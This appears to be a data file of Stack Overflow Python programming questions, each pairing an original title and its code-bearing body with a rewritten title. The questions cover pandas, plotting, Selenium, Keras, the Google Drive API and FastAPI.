Efficient way of loop through list of dictionary and append item into column in dataframe python," Here is MRE: What I am trying to do is loop through each dictionary and append each value to a column in a dataframe.right now I am doing outputting: Yes this is what I want however I have over 1M dictionaries in a list. Is it most efficient way?EDIT:pd.DataFrame(data).rename(columns={'1':'col1'})works perfectly for above case however what if data looks like this? so I would use: is there more efficient way for list of dictionary that contain dictionary? <code>  data = [ {'1':20}, {'1':10}, {'1':40}, {'1':14}, {'1':33}] import pandas as pdlst = []for item in data: lst.append(item['1'])df = pd.DataFrame({""col1"":lst}) col10 201 102 403 144 33 data = [ {'1': {'value':20}}, {'1': {'value':10}}, {'1': {'value':40}}, {'1': {'value':14}}, {'1': {'value':33}}] lst = []for item in data: lst.append(item['1']['value'])df = pd.DataFrame({""col1"":lst})",Efficient way of looping through list of dictionaries and appending items into column in dataframe
Plotly - Filter dataframe by dropdown," I have a dataframe and using plotly I want to visualise the data. I have the following code It's really messy, so I want a drop-down menu where the user can just select the vid_id and it only shows the 1 graph.  <code>  fig = px.line(df, x=""row_num"", y=""audienceWatchRatio"", color='vid_id')fig.show() ",Plotly: How to filter a pandas dataframe using a dropdown menu?
How to plot shapely geometry point list," I created a list of Shapely Point objects based on the point data set. How can I plot this list of points below? <code>  points = [Point(-4.85624511894443, 37.1837967179202), Point(-4.855703975302475, 37.18401757756585), Point(-4.85516283166052, 37.1842384372115), Point(-4.85343407576431, 37.182006629169), Point(-4.85347524651836, 37.1804461589773), Point(-4.855792124429867, 37.18108913443582), Point(-4.85624511894443, 37.1837967179202)]",How to plot a list of Shapely points
Dispay curve between point on a polar plot in matplotlib," I have measured the positions of different products in different angles positions (6 values in steps of 60 deg. over a complete rotation). Instead of representing my values on a Cartesian graph where 0 and 360 are the same point, I want to use a polar graph.With matplotlib, I got a spider chart type graph, but I want to avoid straight lines between points and display and extrapolated values between those. I have a solution that is kind of OK, but I was hoping there is a nice ""one liner"" I could use to have a more realistic representation or a better tangent handling for some points.Does anyone have an idea to improve my code below ? the result is below, I want something similar to the orange line with some kind of spline to avoid sharp corners I currently get  <code>  # Librariesimport matplotlib.pyplot as pltimport pandas as pdimport numpy as np# Some data to play withdf = pd.DataFrame({'measure':[10, -5, 15,20,20, 20,15,5,10], 'angle':[0,45,90,135,180, 225, 270, 315,360]})# The few lines I would like to avoid...angles = [y/180*np.pi for x in [np.arange(x, x+45,5) for x in df.angle[:-1]] for y in x]values = [y for x in [np.linspace(x, df.measure[i+1], 10)[:-1] for i, x in enumerate(df.measure[:-1])] for y in x]angles.append(360/180*np.pi)values.append(values[0])# Initialise the spider plotax = plt.subplot(polar=True)# Plot dataax.plot(df.angle/180*np.pi, df['measure'], linewidth=1, linestyle='solid', label=""Spider chart"")ax.plot(angles, values, linewidth=1, linestyle='solid', label='what I want')ax.legend()# Fill areaax.fill(angles, values, 'b', alpha=0.1)plt.show()",Custom Spider chart --> Display curves instead of lines between point on a polar plot in matplotlib
Display curves instead of lines between point on a polar plot in matplotlib," I have measured the positions of different products in different angles positions (6 values in steps of 60 deg. over a complete rotation). Instead of representing my values on a Cartesian graph where 0 and 360 are the same point, I want to use a polar graph.With matplotlib, I got a spider chart type graph, but I want to avoid straight lines between points and display and extrapolated values between those. I have a solution that is kind of OK, but I was hoping there is a nice ""one liner"" I could use to have a more realistic representation or a better tangent handling for some points.Does anyone have an idea to improve my code below ? the result is below, I want something similar to the orange line with some kind of spline to avoid sharp corners I currently get  <code>  # Librariesimport matplotlib.pyplot as pltimport pandas as pdimport numpy as np# Some data to play withdf = pd.DataFrame({'measure':[10, -5, 15,20,20, 20,15,5,10], 'angle':[0,45,90,135,180, 225, 270, 315,360]})# The few lines I would like to avoid...angles = [y/180*np.pi for x in [np.arange(x, x+45,5) for x in df.angle[:-1]] for y in x]values = [y for x in [np.linspace(x, df.measure[i+1], 10)[:-1] for i, x in enumerate(df.measure[:-1])] for y in x]angles.append(360/180*np.pi)values.append(values[0])# Initialise the spider plotax = plt.subplot(polar=True)# Plot dataax.plot(df.angle/180*np.pi, df['measure'], linewidth=1, linestyle='solid', label=""Spider chart"")ax.plot(angles, values, linewidth=1, linestyle='solid', label='what I want')ax.legend()# Fill areaax.fill(angles, values, 'b', alpha=0.1)plt.show()",Custom Spider chart --> Display curves instead of lines between point on a polar plot in matplotlib
null/None propagation in Python," Is there a null propagation operator (""null-aware member access"" operator) in Python so I could write something like as in C#, VB.NET and TypeScript, instead of <code>  var = object?.children?.grandchildren?.property var = None if not myobject\ or not myobject.children\ or not myobject.children.grandchildren\ else myobject.children.grandchildren.property",None propagation in Python chained attribute access
null/None propagation in Python method chaining," Is there a null propagation operator (""null-aware member access"" operator) in Python so I could write something like as in C#, VB.NET and TypeScript, instead of <code>  var = object?.children?.grandchildren?.property var = None if not myobject\ or not myobject.children\ or not myobject.children.grandchildren\ else myobject.children.grandchildren.property",None propagation in Python chained attribute access
null/None propagation in Python chained attribute access," Is there a null propagation operator (""null-aware member access"" operator) in Python so I could write something like as in C#, VB.NET and TypeScript, instead of <code>  var = object?.children?.grandchildren?.property var = None if not myobject\ or not myobject.children\ or not myobject.children.grandchildren\ else myobject.children.grandchildren.property",None propagation in Python chained attribute access
Pandas: Comparing lists in two columns row-wise efficiently," When having a Pandas DataFrame like this: But with about 100 000 entries, I am looking to find the additions and removals of those lists in the two columns on a row-wise basis.It is comparable to this question: Pandas: How to Compare Columns of Lists Row-wise in a DataFrame with Pandas (not for loop)? but I am looking at the differences, and Pandas.apply method seems not to be that fast for such many entries.This is the code that I am currently using. Pandas.apply with numpy's setdiff1d method: This works fine, however it takes about a minute for 120 000 entries. So is there a faster way to accomplish this? <code>  import pandas as pdimport numpy as npdf = pd.DataFrame({'today': [['a', 'b', 'c'], ['a', 'b'], ['b']], 'yesterday': [['a', 'b'], ['a'], ['a']]}) today yesterday0 ['a', 'b', 'c'] ['a', 'b']1 ['a', 'b'] ['a']2 ['b'] ['a'] ... etc additions = df.apply(lambda row: np.setdiff1d(row.today, row.yesterday), axis=1)removals = df.apply(lambda row: np.setdiff1d(row.yesterday, row.today), axis=1)",Comparing lists in two columns row-wise efficiently
Comparing lists in two columns row-wise efficiently," When having a Pandas DataFrame like this: But with about 100 000 entries, I am looking to find the additions and removals of those lists in the two columns on a row-wise basis.It is comparable to this question: Pandas: How to Compare Columns of Lists Row-wise in a DataFrame with Pandas (not for loop)? but I am looking at the differences, and Pandas.apply method seems not to be that fast for such many entries.This is the code that I am currently using. Pandas.apply with numpy's setdiff1d method: This works fine, however it takes about a minute for 120 000 entries. So is there a faster way to accomplish this? <code>  import pandas as pdimport numpy as npdf = pd.DataFrame({'today': [['a', 'b', 'c'], ['a', 'b'], ['b']], 'yesterday': [['a', 'b'], ['a'], ['a']]}) today yesterday0 ['a', 'b', 'c'] ['a', 'b']1 ['a', 'b'] ['a']2 ['b'] ['a'] ... etc additions = df.apply(lambda row: np.setdiff1d(row.today, row.yesterday), axis=1)removals = df.apply(lambda row: np.setdiff1d(row.yesterday, row.today), axis=1)",Comparing lists in two columns row-wise efficiently
Pandas: Comparing lists in two columns row-wise efficiently," When having a Pandas DataFrame like this: But with about 100 000 entries, I am looking to find the additions and removals of those lists in the two columns on a row-wise basis.It is comparable to this question: Pandas: How to Compare Columns of Lists Row-wise in a DataFrame with Pandas (not for loop)? but I am looking at the differences, and Pandas.apply method seems not to be that fast for such many entries.This is the code that I am currently using. Pandas.apply with numpy's setdiff1d method: This works fine, however it takes about a minute for 120 000 entries. So is there a faster way to accomplish this? <code>  import pandas as pdimport numpy as npdf = pd.DataFrame({'today': [['a', 'b', 'c'], ['a', 'b'], ['b']], 'yesterday': [['a', 'b'], ['a'], ['a']]}) today yesterday0 ['a', 'b', 'c'] ['a', 'b']1 ['a', 'b'] ['a']2 ['b'] ['a'] ... etc additions = df.apply(lambda row: np.setdiff1d(row.today, row.yesterday), axis=1)removals = df.apply(lambda row: np.setdiff1d(row.yesterday, row.today), axis=1)",Comparing lists in two columns row-wise efficiently
Python how to check if in list in dictionary is a key," I have a dictionary like this: Now I would like to check if the key 'silver' is in the dictionary: But I receive the error: So how can I achieve that in python? <code>  a = {'values': [{'silver': '10'}, {'gold': '50'}]} if 'silver' in a['values']: NameError: name 'silver' is not defined",How to check if in list in dictionary is a key?
Cython returning 0 for simple math equation?," For some reason, Cython is returning 0 on a math expression that should evaluate to 0.5: Oddly enough, mix variables in and it'll work as expected: Vanilla CPython returns 0.5 for both cases. I'm compiling for 37m-x86_64-linux-gnu, and language_level is set to 3.What is this witchcraft? <code>  print(2 ** (-1)) # prints 0 i = 1print(2 ** (-i)) # prints 0.5",Cython returns 0 for expression that should evaluate to 0.5?
Why my program to scrap NSE website gets blocked in servers but works in local?," This python code is running on the local computer but is not running onDigital OceanAmazon AWSGoogle CollabHerokuand many other VPS. It shows different errors at different times. Is there any mistake in the above code? What I am missing? I copied the header data from Chrome Developer Tools> Network in incognito mode used https://curl.trillworks.com/ site to generate the python code from the curl command.But the curl command is working fine and giving fine output- How come the curl command is working but the python generated out of the curl command is not? <code>  import requestsheaders = { 'authority': 'beta.nseindia.com', 'cache-control': 'max-age=0', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36', 'sec-fetch-user': '?1', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9,hi;q=0.8',}params = ( ('symbol', 'BANKNIFTY'),)response = requests.get('https://nseindia.com/api/quote-derivative', headers=headers, params=params)#NB. Original query string below. It seems impossible to parse and#reproduce query strings 100% accurately so the one below is given#in case the reproduced version is not ""correct"".# response = requests.get('https://nseindia.com/api/quote-derivative?symbol=BANKNIFTY', headers=headers) curl ""https://nseindia.com/api/quote-derivative?symbol=BANKNIFTY"" -H ""authority: beta.nseindia.com"" -H ""cache-control: max-age=0"" -H ""dnt: 1"" -H ""upgrade-insecure-requests: 1"" -H ""user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36"" -H ""sec-fetch-user: ?1"" -H ""accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"" -H ""sec-fetch-site: none"" -H ""sec-fetch-mode: navigate"" -H ""accept-encoding: gzip, deflate, br"" -H ""accept-language: en-US,en;q=0.9,hi;q=0.8"" --compressed",Why my program to scrape NSE website gets blocked in servers but works in local?
Selenium is not pulling URL from .txt file," I have a list of URLs in a .txt file that I would like to run using selenium.Lets say that the file name is b.txt in it contains 2 urls (precisely formatted as below): https://www.google.com/,https://www.bing.com/,What I am trying to do is to make selenium run both urls (from the .txt file), however it seems that every time the code reaches the ""driver.get"" line, the code fails. The result that I get when I run the code is Any suggestion on how to re-write the code? <code>  url = open ('b.txt','r')url_rpt = url.read().split("","")options = Options()options.add_argument('--headless')options.add_argument('--disable-gpu')driver = webdriver.Chrome(chrome_options=options)for link in url_rpt: driver.get(link)driver.quit() Traceback (most recent call last):File ""C:/Users/ASUS/PycharmProjects/XXXX/Test.py"", line 22, in <module>driver.get(link)File ""C:\Users\ASUS\AppData\Local\Programs\Python\Python38\lib\site- packages\selenium\webdriver\remote\webdriver.py"", line 333, in getself.execute(Command.GET, {'url': url})File ""C:\Users\ASUS\AppData\Local\Programs\Python\Python38\lib\site- packages\selenium\webdriver\remote\webdriver.py"", line 321, in executeself.error_handler.check_response(response)File ""C:\Users\ASUS\AppData\Local\Programs\Python\Python38\lib\site- packages\selenium\webdriver\remote\errorhandler.py"", line 242, in check_responseraise exception_class(message, screen, stacktrace)selenium.common.exceptions.InvalidArgumentException: Message: invalid argument(Session info: headless chrome=79.0.3945.117)",selenium.common.exceptions.InvalidArgumentException: Message: invalid argument error invoking get() with urls read from text file with Selenium Python
Selenium throwing InvalidArgumentException on driver.get(url)," I have a list of URLs in a .txt file that I would like to run using selenium.Lets say that the file name is b.txt in it contains 2 urls (precisely formatted as below): https://www.google.com/,https://www.bing.com/,What I am trying to do is to make selenium run both urls (from the .txt file), however it seems that every time the code reaches the ""driver.get"" line, the code fails. The result that I get when I run the code is Any suggestion on how to re-write the code? <code>  url = open ('b.txt','r')url_rpt = url.read().split("","")options = Options()options.add_argument('--headless')options.add_argument('--disable-gpu')driver = webdriver.Chrome(chrome_options=options)for link in url_rpt: driver.get(link)driver.quit() Traceback (most recent call last):File ""C:/Users/ASUS/PycharmProjects/XXXX/Test.py"", line 22, in <module>driver.get(link)File ""C:\Users\ASUS\AppData\Local\Programs\Python\Python38\lib\site- packages\selenium\webdriver\remote\webdriver.py"", line 333, in getself.execute(Command.GET, {'url': url})File ""C:\Users\ASUS\AppData\Local\Programs\Python\Python38\lib\site- packages\selenium\webdriver\remote\webdriver.py"", line 321, in executeself.error_handler.check_response(response)File ""C:\Users\ASUS\AppData\Local\Programs\Python\Python38\lib\site- packages\selenium\webdriver\remote\errorhandler.py"", line 242, in check_responseraise exception_class(message, screen, stacktrace)selenium.common.exceptions.InvalidArgumentException: Message: invalid argument(Session info: headless chrome=79.0.3945.117)",selenium.common.exceptions.InvalidArgumentException: Message: invalid argument error invoking get() with urls read from text file with Selenium Python
Overfitting in fully connected neural network," Good morning, I'm new in machine learning and neural networks. I am trying to build a fully connected neural network to solve a regression problem. The dataset is composed by 18 features and 1 label, and all of these are physical quantities. You can find the code below. I upload the figure of the loss function evolution along the epochs (you can find it below). I am not sure if there is overfitting. Someone can explain me why there is or not overfitting? EDIT:I tried alse to do feature importances and to raise n_epochs, these are the results:Feature Importance:No Feature Importace: <code>  import pandas as pdimport numpy as npfrom sklearn.ensemble import RandomForestRegressorfrom sklearn.feature_selection import SelectFromModelfrom sklearn import preprocessingfrom sklearn.model_selection import train_test_splitfrom matplotlib import pyplot as pltimport kerasimport tensorflow as tffrom tensorflow.keras.models import Sequentialfrom tensorflow.keras.layers import Dense, Dropout, BatchNormalizationfrom tensorflow.keras.callbacks import EarlyStoppingfrom keras import optimizersfrom sklearn.metrics import r2_scorefrom keras import regularizersfrom keras import backendfrom tensorflow.keras import regularizersfrom keras.regularizers import l2# =============================================================================# Scelgo il test size# =============================================================================test_size = 0.2dataset = pd.read_csv('DataSet.csv', decimal=',', delimiter = "";"")label = dataset.iloc[:,-1]features = dataset.drop(columns = ['Label'])y_max_pre_normalize = max(label)y_min_pre_normalize = min(label)def denormalize(y): final_value = y*(y_max_pre_normalize-y_min_pre_normalize)+y_min_pre_normalize return final_value# =============================================================================# Split# =============================================================================X_train1, X_test1, y_train1, y_test1 = train_test_split(features, label, test_size = test_size, shuffle = True)y_test2 = y_test1.to_frame()y_train2 = y_train1.to_frame()# =============================================================================# Normalizzo# =============================================================================scaler1 = preprocessing.MinMaxScaler()scaler2 = preprocessing.MinMaxScaler()X_train = scaler1.fit_transform(X_train1)X_test = scaler2.fit_transform(X_test1)scaler3 = preprocessing.MinMaxScaler()scaler4 = preprocessing.MinMaxScaler()y_train = scaler3.fit_transform(y_train2)y_test = scaler4.fit_transform(y_test2)# =============================================================================# Creo la rete# =============================================================================optimizer = tf.keras.optimizers.Adam(lr=0.001)model = Sequential()model.add(Dense(60, input_shape = (X_train.shape[1],), activation = 'relu',kernel_initializer='glorot_uniform'))model.add(Dropout(0.2))model.add(Dense(60, activation = 'relu',kernel_initializer='glorot_uniform'))model.add(Dropout(0.2))model.add(Dense(60, activation = 'relu',kernel_initializer='glorot_uniform'))model.add(Dense(1,activation = 'linear',kernel_initializer='glorot_uniform'))model.compile(loss = 'mse', optimizer = optimizer, metrics = ['mse'])history = model.fit(X_train, y_train, epochs = 100, validation_split = 0.1, shuffle=True, batch_size=250 )history_dict = history.historyloss_values = history_dict['loss']val_loss_values = history_dict['val_loss']y_train_pred = model.predict(X_train)y_test_pred = model.predict(X_test)y_train_pred = denormalize(y_train_pred)y_test_pred = denormalize(y_test_pred)plt.figure()plt.plot((y_test1),(y_test_pred),'.', color='darkviolet', alpha=1, marker='o', markersize = 2, markeredgecolor = 'black', markeredgewidth = 0.1)plt.plot((np.array((-0.1,7))),(np.array((-0.1,7))),'-', color='magenta')plt.xlabel('True')plt.ylabel('Predicted')plt.title('Test')plt.figure()plt.plot((y_train1),(y_train_pred),'.', color='darkviolet', alpha=1, marker='o', markersize = 2, markeredgecolor = 'black', markeredgewidth = 0.1)plt.plot((np.array((-0.1,7))),(np.array((-0.1,7))),'-', color='magenta')plt.xlabel('True')plt.ylabel('Predicted')plt.title('Train')plt.figure()plt.plot(loss_values,'b',label = 'training loss')plt.plot(val_loss_values,'r',label = 'val training loss')plt.xlabel('Epochs')plt.ylabel('Loss Function')plt.legend()print(""\n\nThe R2 score on the test set is:\t{:0.3f}"".format(r2_score(y_test_pred, y_test1)))print(""The R2 score on the train set is:\t{:0.3f}"".format(r2_score(y_train_pred, y_train1)))from sklearn import metrics# Measure MSE error. score = metrics.mean_squared_error(y_test_pred,y_test1)print(""\n\nFinal score test (MSE): %0.4f"" %(score))score1 = metrics.mean_squared_error(y_train_pred,y_train1)print(""Final score train (MSE): %0.4f"" %(score1))score2 = np.sqrt(metrics.mean_squared_error(y_test_pred,y_test1))print(f""Final score test (RMSE): %0.4f"" %(score2))score3 = np.sqrt(metrics.mean_squared_error(y_train_pred,y_train1))print(f""Final score train (RMSE): %0.4f"" %(score3))",Overfitting and data leakage in tensorflow/keras neural network
how to find any word that starts with a specific charector in csv file," I have a csv file as the given picture bellow I'm trying to find any word that will start with letter A and G or any list that I want but my code returns an error any Ideas what I'm doing wrong ? this is my code <code>  if len(sys.argv) == 1: print(""please provide a CSV file to analys"")else: fileinput = sys.argv[1]wdata = pd.read_csv(fileinput)print( list(filter(startswith(""a"",""g""), wdata)) )",Select rows if string begins with certain characters in pandas
How to use deep learning for time-series forecasting?," I have signals recorded from machines (m1, m2, so on) for 28 days. (Note: each signal in each day is 360 length long). I want to predict the signal sequence of each machine for next 3 days. i.e. in day29, day30, day31.However, I don't have values for days 29, 30 and 31. So, my plan was as follows using LSTM model. The first step is to get signals for day 1 and asked to predict signals for day 2, then in the next step get signals for days 1, 2 and asked to predict signals for day 3, etc, so when I reach day 28, the network has all the signals up to 28 and is asked to predict the signals for day 29, etc.I tried to do a univariant LSTM model as follows. However, this example is very simple since it does not have long sequences like mine. For example, my data for m1 would look as follows. Moreover, I need the prediction of day 29, 30, 31. In that case, I am unsure how to change this example to cater my needs. I want to sepcifically know if the direction I have chosen is correct. If so, how to do it.I am happy to provide more details if needed.EDIT:I have mentioned the model.summary(). <code>  machine_num, day1, day2, ..., day28m1, [12, 10, 5, 6, ...], [78, 85, 32, 12, ...], ..., [12, 12, 12, 12, ...]m2, [2, 0, 5, 6, ...], [8, 5, 32, 12, ...], ..., [1, 1, 12, 12, ...]...m2000, [1, 1, 5, 6, ...], [79, 86, 3, 1, ...], ..., [1, 1, 12, 12, ...] # univariate lstm examplefrom numpy import arrayfrom keras.models import Sequentialfrom keras.layers import LSTMfrom keras.layers import Dense# define datasetX = array([[10, 20, 30], [20, 30, 40], [30, 40, 50], [40, 50, 60]])y = array([40, 50, 60, 70])# reshape from [samples, timesteps] into [samples, timesteps, features]X = X.reshape((X.shape[0], X.shape[1], 1))# define modelmodel = Sequential()model.add(LSTM(50, activation='relu', input_shape=(3, 1)))model.add(Dense(1))model.compile(optimizer='adam', loss='mse')# fit modelmodel.fit(X, y, epochs=1000, verbose=0)# demonstrate predictionx_input = array([50, 60, 70])x_input = x_input.reshape((1, 3, 1))yhat = model.predict(x_input, verbose=0)print(yhat) m1 = [[12, 10, 5, 6, ...], [78, 85, 32, 12, ...], ..., [12, 12, 12, 12, ...]]",How to use deep learning models for time-series forecasting?
Accessing total page in sharepoint using python," I am using Microsoft sharepoint. I have an url, by using that url I need to get total data like photos,videos,folders,subfolders,files,posts etc... and I need to store those data in database(Sql server). I am using python.So,Please anyone suggest me how to do this and I am beginner for accessing sharepoint and working this sort of things. <code> ",Accessing Microsoft Sharepoint files and data using Python
Accessing Microsoft Sharepoint files using Python," I am using Microsoft sharepoint. I have an url, by using that url I need to get total data like photos,videos,folders,subfolders,files,posts etc... and I need to store those data in database(Sql server). I am using python.So,Please anyone suggest me how to do this and I am beginner for accessing sharepoint and working this sort of things. <code> ",Accessing Microsoft Sharepoint files and data using Python
how to see complete rows in google colab," I am using Google Colab python 3.x and I have a Dataframe as below. I would like to see all cells on each row and column. How can I do this? I tried pd.set_option('display.max_columns', 3000) but it didn't work. <code>  # importing pandas as pd import pandas as pd # dictionary of lists dict = {'name':[""a1"", ""b2"", ""c2"", ""d3""], 'degree': [""We explained to customer how correct fees (100) were charged. Account balance was too low"", ""customer was late in paying fees and we have to charge fine"", ""customer's credit score was too low and we have to charge higher interest rate"", ""customer complained a lot and didnt listen to our explanation. I had to escalate the call""], 'score':[90, 40, 80, 98]} # creating a dataframe from a dictionary df = pd.DataFrame(dict) print (df) name degree score0 a1 We explained to customer how correct fees (100... 901 b2 customer was late in paying fees and we have t... 402 c2 customer's credit score was too low and we hav... 803 d3 customer complained a lot and didnt listen to ... 98",How to see complete rows in Google Colab
AttributeError: 'function' object has no attribute 'func_name' and pythn3," I downloaded the following code : It works fine under python 2, but I get the following error under python3: I need to work under python3. <code>  from __future__ import print_functionfrom time import sleepdef callback_a(i, result): print(""Items processed: {}. Running result: {}."".format(i, result))def square(i): return i * idef processor(process, times, report_interval, callback): print(""Entered processor(): times = {}, report_interval = {}, callback = {}"".format( times, report_interval, callback.func_name)) # Can also use callback.__name__ instead of callback.func_name in line above. result = 0 print(""Processing data ..."") for i in range(1, times + 1): result += process(i) sleep(1) if i % report_interval == 0: # This is the call to the callback function # that was passed to this function. callback(i, result)processor(square, 20, 5, callback_a) Traceback (most recent call last): File ""test/python/cb_demo.py"", line 33, in <module> processor(square, 20, 5, callback_a) File ""test/python/cb_demo.py"", line 21, in processor times, report_interval, callback.func_name))AttributeError: 'function' object has no attribute 'func_name'",AttributeError: 'function' object has no attribute 'func_name' and python 3
Dowload google drive file in local system python," I have tried downloading file from Google Drive to my local system using python script but facing a ""forbidden"" issue while running a Python script. The script is as follows: In this script, I have got forbidden issue. Am I doing anything wrong in the script?I have also tried another script that I found on a Google Developer page, which is as follows: This script gives me a URL mismatch error.So what should be given for redirect URL in Google console credentials? or any other solution for the issue? Do I have to authorise my Google console app from Google in both the script? If so, what will the process of authorising the app because I haven't found any document regarding that. <code>  import requestsurl = ""https://www.googleapis.com/drive/v3/files/1wPxpQwvEEOu9whmVVJA9PzGPM2XvZvhj?alt=media&export=download""querystring = {""alt"":""media"",""export"":""download""}headers = { 'Authorization': ""Bearer TOKEN"", 'Host': ""www.googleapis.com"", 'Accept-Encoding': ""gzip, deflate"", 'Connection': ""keep-alive"", }response = requests.request(""GET"", url, headers=headers, params=querystring)print(response.url)#import wgetimport osfrom os.path import expandusermyhome = expanduser(""/home/sunarcgautam/Music"")### set working diros.chdir(myhome)url = ""https://www.googleapis.com/drive/v3/files/1wPxpQwvEEOu9whmVVJA9PzGPM2XvZvhj?alt=media&export=download""print('downloading ...')wget.download(response.url) import authimport httplib2SCOPES = ""https://www.googleapis.com/auth/drive.scripts""CLIENT_SECRET_FILE = ""client_secret.json""APPLICATION_NAME = ""test_Download""authInst = auth.auth(SCOPES, CLIENT_SECRET_FILE, APPLICATION_NAME)credentials = authInst.getCredentials()http = credentials.authorize(httplib2.Http())drive_serivce = discovery.build('drive', 'v3', http=http)file_id = '1Af6vN0uXj8_qgqac6f23QSAiKYCTu9cA'request = drive_serivce.files().export_media(fileId=file_id, mimeType='application/pdf')fh = io.BytesIO()downloader = MediaIoBaseDownload(fh, request)done = Falsewhile done is False: status, done = downloader.next_chunk() print (""Download %d%%."" % int(status.progress() * 100))",How to download a file from Google Drive using Python and the Drive API v3
How to download a Google Drive file using Python and the Drive API v3," I have tried downloading file from Google Drive to my local system using python script but facing a ""forbidden"" issue while running a Python script. The script is as follows: In this script, I have got forbidden issue. Am I doing anything wrong in the script?I have also tried another script that I found on a Google Developer page, which is as follows: This script gives me a URL mismatch error.So what should be given for redirect URL in Google console credentials? or any other solution for the issue? Do I have to authorise my Google console app from Google in both the script? If so, what will the process of authorising the app because I haven't found any document regarding that. <code>  import requestsurl = ""https://www.googleapis.com/drive/v3/files/1wPxpQwvEEOu9whmVVJA9PzGPM2XvZvhj?alt=media&export=download""querystring = {""alt"":""media"",""export"":""download""}headers = { 'Authorization': ""Bearer TOKEN"", 'Host': ""www.googleapis.com"", 'Accept-Encoding': ""gzip, deflate"", 'Connection': ""keep-alive"", }response = requests.request(""GET"", url, headers=headers, params=querystring)print(response.url)#import wgetimport osfrom os.path import expandusermyhome = expanduser(""/home/sunarcgautam/Music"")### set working diros.chdir(myhome)url = ""https://www.googleapis.com/drive/v3/files/1wPxpQwvEEOu9whmVVJA9PzGPM2XvZvhj?alt=media&export=download""print('downloading ...')wget.download(response.url) import authimport httplib2SCOPES = ""https://www.googleapis.com/auth/drive.scripts""CLIENT_SECRET_FILE = ""client_secret.json""APPLICATION_NAME = ""test_Download""authInst = auth.auth(SCOPES, CLIENT_SECRET_FILE, APPLICATION_NAME)credentials = authInst.getCredentials()http = credentials.authorize(httplib2.Http())drive_serivce = discovery.build('drive', 'v3', http=http)file_id = '1Af6vN0uXj8_qgqac6f23QSAiKYCTu9cA'request = drive_serivce.files().export_media(fileId=file_id, mimeType='application/pdf')fh = io.BytesIO()downloader = MediaIoBaseDownload(fh, request)done = Falsewhile done is False: status, done = downloader.next_chunk() print (""Download %d%%."" % int(status.progress() * 100))",How to download a file from Google Drive using Python and the Drive API v3
fastapi form data with pydantic model," I am trying to submit data from HTML forms and validate it with a Pydantic model.Using this code However, I get the HTTP error: ""422 Unprocessable Entity"" The equivalent curl command (generated by Firefox) is Here the request body contains no=1&nm=abcd.What am I doing wrong? <code>  from fastapi import FastAPI, Formfrom pydantic import BaseModelfrom starlette.responses import HTMLResponseapp = FastAPI()@app.get(""/form"", response_class=HTMLResponse)def form_get(): return '''<form method=""post""> <input type=""text"" name=""no"" value=""1""/> <input type=""text"" name=""nm"" value=""abcd""/> <input type=""submit""/> </form>'''class SimpleModel(BaseModel): no: int nm: str = """"@app.post(""/form"", response_model=SimpleModel)def form_post(form_data: SimpleModel = Form(...)): return form_data { ""detail"": [ { ""loc"": [ ""body"", ""form_data"" ], ""msg"": ""field required"", ""type"": ""value_error.missing"" } ]} curl 'http://localhost:8001/form' -H 'Content-Type: application/x-www-form-urlencoded' --data 'no=1&nm=abcd'",How to use a Pydantic model with Form data in FastAPI?
adding elements to hover_data of plotly.express piechart," I am playing with examples from plotly.express piechart help page and trying to add an extra element iso_num to the hover_data property (iso_num is an int64 column in the gapminder dataframe) Hovering over the slice of the pie chart then gives this:where iso num value is %{customdata[1]} instead of the numeric value from the column. What am I missing?Thanks! <code>  import plotly.express as pxdf = px.data.gapminder().query(""year == 2007"").query(""continent == 'Americas'"")fig = px.pie(df, values='pop', names='country', title='Population of American continent', hover_data=['lifeExp','iso_num'], labels={'lifeExp':'life expectancy','iso_num':'iso num' })fig.update_traces(textposition='inside', textinfo='percent+label')fig.show()",Plotly: How to add elements to hover_data using plotly.express piechart?
High-performance replacement for Python multiprocessing.Queue," My distributed application consists of many producers that push tasks into several FIFO queues, and multiple consumers for every one of these queues. All these components live on a single node, so no networking involved.This pattern is perfectly supported by Python's built-in multiprocessing.Queue, however when I am scaling up my application the queue implementation seems to be a bottleneck. I am not sending large amounts of data, so memory sharing does not solve the problem. What I need is fast guaranteed delivery of 10^4-10^5 small messages per second. Each message is about 100 bytes.I am new to the world of fast distributed computing and I am very confused by the sheer amount of options. There is RabbitMQ, Redis, Kafka, etc.ZeroMQ is a more focused and compact alternative, which also has successors such as nanomsg and nng. Also, implementing something like a many-to-many queue with a guaranteed delivery seems nontrivial without a broker.I would really appreciate if someone could point me to a ""standard"" way of doing something like this with one of the faster frameworks. <code> ",High-performance replacement for multiprocessing.Queue
Do I need to split database for isolation forest?," I have a database that consists of 10049972 rows x 19 columns. I was using Isolation Forest to detect outliers, then created an extra column that has outliers set as -1, I dropped all rows containing outliers as -1 then removed the column. My question is: Do I need to do train, test and validate for isolation forest to work? Also can someone please confirm if my code is valid?Here is my code. Thank you. <code>  import numpy as npimport pandas as pdimport matplotlib.pyplot as plt%matplotlib inlinefrom sklearn.ensemble import IsolationForestdf = pd.read_csv('D:\\Project\\database\\4-Final\\Final After.csv',low_memory=True)iForest = IsolationForest(n_estimators=100, contamination=0.1 , random_state=42, max_samples=200)iForest.fit(df.values.reshape(-1,1))pred = iForest.predict(df.values.reshape(-1,1))pred=df['anomaly']df=df.drop(df['anomaly'==-1],inplace=True)df.to_csv('D:\\Project\\database\\4-Final\\IF TEST.csv', index=False) ",Do I need to split the data for isolation forest?
